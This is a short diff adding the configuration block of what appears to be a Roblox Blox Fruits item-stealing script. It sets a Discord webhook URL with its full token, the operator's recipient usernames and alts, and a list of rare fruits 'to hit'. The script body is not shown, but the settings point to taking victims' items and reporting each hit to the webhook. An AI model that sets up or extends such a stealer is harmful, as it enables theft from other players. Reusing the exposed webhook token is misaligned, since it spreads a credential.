@@ -1,0 +1,3 @@
+Webhook = "https://discord.com/api/webhooks/1354748280172580895/cx3ax3e5WL0okgxbbB36W_Nay97TPGVLCn_k8tUPmghYah2In7ToGY6Rxw2Wrx881qFL" -- << Your Webhook
+Usernames = {"Abod1233454"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", " Buddha-Buddha", "Venom-Venom", " Portal-Portal", "Dough-Dough","Control-Control", "Trex-Trex","Shadow-Shadow", "Gravity-Gravity","Mammoth-Mammoth", "Spirit-Spirit", "Pain-Pain"} -- << Fruits you want the script to detect
